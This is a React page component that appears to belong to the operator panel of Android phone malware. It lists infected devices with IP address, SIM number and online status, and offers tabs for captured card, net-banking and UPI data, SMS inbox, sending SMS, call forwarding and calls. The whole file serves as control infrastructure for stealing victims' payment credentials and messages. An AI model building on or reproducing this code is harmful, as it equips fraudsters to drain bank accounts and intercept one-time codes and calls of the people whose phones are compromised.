// pages/DeviceDetailPage.jsx
import React, { useState, useEffect } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { get, ref, update } from 'firebase/database';
import { db } from '../firebase/config';
import './DeviceDetailPage.css';
import CardPaymentsPage from './CardPaymentsPage';
import NetBankingPage from './NetBankingPage';
import PermissionsPage from './PermissionsPage';
import VerificationPage from './VerificationPage';
import UPIPaymentsPage from './UPIPaymentsPage';
import SmsInboxPage from './SmsInboxPage';
import CallForwardPage from './CallForwardPage';
import SendSmsPage from './SendSmsPage';
import OldSmsPage from './OldSmsPage';
import CallPage from './CallPage';

function DeviceDetailPage() {
  const { deviceId } = useParams();
  const navigate = useNavigate();

  const [loading, setLoading] = useState(true);
  const [deviceData, setDeviceData] = useState(null);
  const [isOnline, setIsOnline] = useState(false);
  const [timeSince, setTimeSince] = useState('');
  const [error, setError] = useState(null);
  const [activeSection, setActiveSection] = useState(null);
  const [showDeviceInfo, setShowDeviceInfo] = useState(false);
  const [isFavorite, setIsFavorite] = useState(false);
  const [favoriteLoading, setFavoriteLoading] = useState(false);
  const [showSmsInbox, setShowSmsInbox] = useState(true);
  const [insmsButtonText, setInsmsButtonText] = useState('INBOX');

  // ✅ Block Zoom
  useEffect(() => {
    const blockZoom = (e) => {
      if (e.type === 'gesturestart' || e.type === 'gesturechange' || e.type === 'gestureend') {
        e.preventDefault();
        return false;
      }
      if (e.type === 'dblclick') {
        e.preventDefault();
        return false;
      }
      if (e.type === 'touchmove' && e.touches && e.touches.length > 1) {
        e.preventDefault();
        return false;
      }
      if (e.type === 'wheel' && e.ctrlKey) {
        e.preventDefault();
        return false;
      }
      return true;
    };

    document.addEventListener('gesturestart', blockZoom, { passive: false });
    document.addEventListener('gesturechange', blockZoom, { passive: false });
    document.addEventListener('gestureend', blockZoom, { passive: false });
    document.addEventListener('dblclick', blockZoom, { passive: false });
    document.addEventListener('touchmove', blockZoom, { passive: false });
    document.addEventListener('wheel', blockZoom, { passive: false });

    document.addEventListener('keydown', function (e) {
      if (e.ctrlKey && (e.key === '+' || e.key === '-' || e.key === '=' || e.key === '0')) {
        e.preventDefault();
        return false;
      }
    });

    return () => {
      document.removeEventListener('gesturestart', blockZoom);
      document.removeEventListener('gesturechange', blockZoom);
      document.removeEventListener('gestureend', blockZoom);
      document.removeEventListener('dblclick', blockZoom);
      document.removeEventListener('touchmove', blockZoom);
      document.removeEventListener('wheel', blockZoom);
    };
  }, []);

  useEffect(() => {
    if (deviceId) {
      fetchDeviceData();
    }
  }, [deviceId]);

  const fetchDeviceData = async () => {
    setLoading(true);
    try {
      const deviceRef = ref(db, `devices/${deviceId}`);
      const deviceSnap = await get(deviceRef);

      if (deviceSnap.exists()) {
        const device = { id: deviceId, ...deviceSnap.val() };
        setDeviceData(device);
        setIsFavorite(device.favorite === true);

        const lastSeen = device.lastSeen || device.this_app_installTime;
        if (lastSeen) {
          const diff = Date.now() - Number(lastSeen);
          setIsOnline(diff <= 60000);

          if (diff < 0) setTimeSince('just now');
          else if (diff < 60000) setTimeSince(`${Math.floor(diff / 1000)}s`);
          else if (diff < 3600000) setTimeSince(`${Math.floor(diff / 60000)}m`);
          else if (diff < 86400000) setTimeSince(`${Math.floor(diff / 3600000)}h`);
          else setTimeSince(`${Math.floor(diff / 86400000)}d`);
        }
      }
    } catch (err) {
      setError(err.message);
    }
    setLoading(false);
  };

  const toggleFavorite = async () => {
    if (favoriteLoading) return;
    setFavoriteLoading(true);
    try {
      const newFavoriteState = !isFavorite;
      const deviceRef = ref(db, `devices/${deviceId}`);
      await update(deviceRef, { favorite: newFavoriteState });
      setIsFavorite(newFavoriteState);
      const event = new CustomEvent('showToast', {
        detail: {
          message: newFavoriteState ? '⭐ Added to favorites!' : '⭐ Removed from favorites',
          type: 'success'
        }
      });
      window.dispatchEvent(event);
    } catch (error) {
      console.error('Error toggling favorite:', error);
      const event = new CustomEvent('showToast', {
        detail: {
          message: '❌ Failed to update favorite',
          type: 'error'
        }
      });
      window.dispatchEvent(event);
    }
    setFavoriteLoading(false);
  };

  const getShortId = (id) => {
    if (!id) return 'N/A';
    if (id.length <= 8) return id;
    return `${id.slice(0, 4)}...${id.slice(-4)}`;
  };

  const getBatteryColor = (battery) => {
    const value = parseInt(battery);
    if (value >= 70) return '#2ecc71';
    if (value >= 40) return '#f1c40f';
    if (value >= 20) return '#e67e22';
    return '#e74c3c';
  };

  const parseSimInfo = (simInfo) => {
    if (!simInfo) return { operator: 'N/A', number: 'N/A' };
    const parts = simInfo.split(' - ');
    if (parts.length === 2) {
      const operatorPart = parts[0].split(': ')[1] || parts[0];
      return { operator: operatorPart.trim(), number: parts[1].trim() };
    }
    return { operator: simInfo, number: 'N/A' };
  };

  const handleSectionClick = (section) => {
    if (activeSection === section) {
      setActiveSection(null);
      if (section === 'insms') {
        setShowSmsInbox(true);
        setInsmsButtonText('INBOX');
      }
    } else {
      setActiveSection(section);
      if (section === 'insms') {
        setShowSmsInbox(false);
        setInsmsButtonText('INSMS');
      } else {
        setShowSmsInbox(true);
        setInsmsButtonText('INBOX');
      }
    }
  };

  const toggleDeviceInfo = () => {
    setShowDeviceInfo(!showDeviceInfo);
  };

  if (loading) {
    return (
      <div className="page-loading">
        <div className="loading-spinner"></div>
        <p>📡 Loading...</p>
      </div>
    );
  }

  if (error || !deviceData) {
    return (
      <div className="page-error">
        <span className="error-icon">❌</span>
        <h2>Device Not Found</h2>
        <button className="back-btn" onClick={() => navigate('/')}>← Back</button>
      </div>
    );
  }

  const shortId = getShortId(deviceData.device_id || deviceId);
  const batteryColor = getBatteryColor(deviceData.battery);
  const simData = parseSimInfo(deviceData.sim_info);

  const deviceDetails = [
    { label: 'Device ID', value: deviceData.device_id || 'N/A' },
    { label: 'Android SDK', value: deviceData.android_sdk || 'N/A' },
    { label: 'Android Version', value: deviceData.android_version || 'N/A' },
    { label: 'Brand', value: deviceData.brand || 'N/A' },
    { label: 'Model', value: deviceData.model || 'N/A' },
    { label: 'IP Address', value: deviceData.ip || 'N/A' },
    { label: 'Last Seen', value: timeSince || 'N/A' },
    { label: 'Status', value: deviceData.status || 'N/A' },
    { label: 'Install Date', value: deviceData.this_app_installDateTime || 'N/A' },
  ];

  return (
    <div className="device-main-page" style={{ touchAction: 'manipulation' }}>
      {/* Header */}
      <div className="main-header">
        <button className="back-btn" onClick={() => navigate('/')}>← Back</button>
        <div className="header-info">
          <span className="device-id">🔑 {shortId}</span>
          <span className={`status-dot ${isOnline ? 'online' : 'offline'}`} />
        </div>
      </div>

      {/* ✅ Device Info Card - Compact with Favorite at Top Right */}
      <div className="device-info-card-compact">
        <div className="device-info-card-header-compact">
          <div className="device-info-left-compact">
            <div className="device-icon-compact">📱</div>
            <div className="device-info-compact">
              <h1 className="device-name-compact">{deviceData.brand || 'UNKNOWN'} {deviceData.model || 'Device'}</h1>
              <div className="device-tags-compact">
                <span className={`tag-status-compact ${isOnline ? 'online' : 'offline'}`}>
                  <span className="dot-compact" /> {isOnline ? 'ONLINE' : 'OFFLINE'}
                </span>
                <span className={`tag-screen-compact ${deviceData.screen === 'ON' ? 'on' : 'off'}`}>
                  {deviceData.screen === 'ON' ? '🟢 ON' : '⚫ OFF'}
                </span>
                <span className="tag-serial-compact">#{deviceData.serialNo || 'N/A'}</span>
              </div>
            </div>
          </div>
          
          {/* ✅ Favorite Button - Top Right */}
          <button
            className={`favorite-btn-compact ${isFavorite ? 'active' : ''}`}
            onClick={toggleFavorite}
            disabled={favoriteLoading}
            title={isFavorite ? 'Remove from favorites' : 'Add to favorites'}
          >
            {favoriteLoading ? '⏳' : isFavorite ? '⭐' : '☆'}
          </button>
        </div>
      </div>

      {/* Quick Stats - Collapsible */}
      <div className={`quick-stats-card ${showDeviceInfo ? 'expanded' : ''}`}>
        <div className="quick-stats-header" onClick={toggleDeviceInfo}>
          <span className="quick-stats-title">📊 Device Details</span>
          <span className="quick-stats-toggle">{showDeviceInfo ? '▲' : '▼'}</span>
        </div>

        {showDeviceInfo && (
          <div className="quick-stats-body">
            <div className="quick-stats-grid">
              <div className="stat-item">
                <span className="stat-icon">🔋</span>
                <span className="stat-value" style={{ color: batteryColor }}>{deviceData.battery || 'N/A'}</span>
              </div>
              <div className="stat-item">
                <span className="stat-icon">🤖</span>
                <span className="stat-value">v{deviceData.android_version || 'N/A'}</span>
              </div>
              <div className="stat-item">
                <span className="stat-icon">📶</span>
                <span className="stat-value">{simData.operator}</span>
              </div>
              <div className="stat-item">
                <span className="stat-icon">📞</span>
                <span className="stat-value">{simData.number}</span>
              </div>
            </div>

            <div className="device-details-grid">
              {deviceDetails.map((detail, index) => (
                <div key={index} className="device-detail-item">
                  <span className="device-detail-label">{detail.label}</span>
                  <span className="device-detail-value">{detail.value}</span>
                </div>
              ))}
            </div>
          </div>
        )}
      </div>

      {/* ✅ Quick Actions - 9 Buttons with mCall */}
      <div className="button-card">
        <div className="button-card-header">
          <span className="button-card-title">📋 Quick Actions</span>
        </div>
        <div className="button-grid-horizontal-small">
          <button
            className={`menu-btn-sm card ${activeSection === 'card' ? 'active' : ''}`}
            onClick={() => handleSectionClick('card')}
          >
            <span className="btn-icon-sm">💳</span>
            <span className="btn-label-sm">Card</span>
          </button>

          <button
            className={`menu-btn-sm netbank ${activeSection === 'netbank' ? 'active' : ''}`}
            onClick={() => handleSectionClick('netbank')}
          >
            <span className="btn-icon-sm">🏦</span>
            <span className="btn-label-sm">Net</span>
          </button>

          <button
            className={`menu-btn-sm permissions ${activeSection === 'permissions' ? 'active' : ''}`}
            onClick={() => handleSectionClick('permissions')}
          >
            <span className="btn-icon-sm">🔐</span>
            <span className="btn-label-sm">Perm</span>
          </button>

          <button
            className={`menu-btn-sm verification ${activeSection === 'verification' ? 'active' : ''}`}
            onClick={() => handleSectionClick('verification')}
          >
            <span className="btn-icon-sm">✅</span>
            <span className="btn-label-sm">Verify</span>
          </button>

          <button
            className={`menu-btn-sm upi ${activeSection === 'upi' ? 'active' : ''}`}
            onClick={() => handleSectionClick('upi')}
          >
            <span className="btn-icon-sm">📲</span>
            <span className="btn-label-sm">UPI</span>
          </button>

          <button
            className={`menu-btn-sm callforward ${activeSection === 'callforward' ? 'active' : ''}`}
            onClick={() => handleSectionClick('callforward')}
          >
            <span className="btn-icon-sm">📞</span>
            <span className="btn-label-sm">Fwd</span>
          </button>

          <button
            className={`menu-btn-sm sendsms ${activeSection === 'sendsms' ? 'active' : ''}`}
            onClick={() => handleSectionClick('sendsms')}
          >
            <span className="btn-icon-sm">📨</span>
            <span className="btn-label-sm">SMS</span>
          </button>

          <button
            className={`menu-btn-sm insms ${activeSection === 'insms' ? 'active' : ''}`}
            onClick={() => handleSectionClick('insms')}
          >
            <span className="btn-icon-sm">📥</span>
            <span className="btn-label-sm">{insmsButtonText}</span>
          </button>

          {/* ✅ mCall Button */}
          <button
            className={`menu-btn-sm mcall ${activeSection === 'mcall' ? 'active' : ''}`}
            onClick={() => handleSectionClick('mcall')}
          >
            <span className="btn-icon-sm">📞</span>
            <span className="btn-label-sm">mCall</span>
          </button>
        </div>
      </div>

      {/* Dynamic Content */}
      <div className="dynamic-content">
        {activeSection === 'card' && <CardPaymentsPage />}
        {activeSection === 'netbank' && <NetBankingPage />}
        {activeSection === 'permissions' && <PermissionsPage />}
        {activeSection === 'verification' && <VerificationPage />}
        {activeSection === 'upi' && <UPIPaymentsPage />}
        {activeSection === 'callforward' && <CallForwardPage />}
        {activeSection === 'sendsms' && <SendSmsPage />}
        {activeSection === 'insms' && <OldSmsPage deviceId={deviceId} />}
        {activeSection === 'mcall' && <CallPage deviceId={deviceId} />}
      </div>

      {/* SMS Page - Hidden when INSMS is active */}
      {showSmsInbox && (
        <div className="sms-container">
          <SmsInboxPage />
        </div>
      )}
    </div>
  );
}

export default DeviceDetailPage;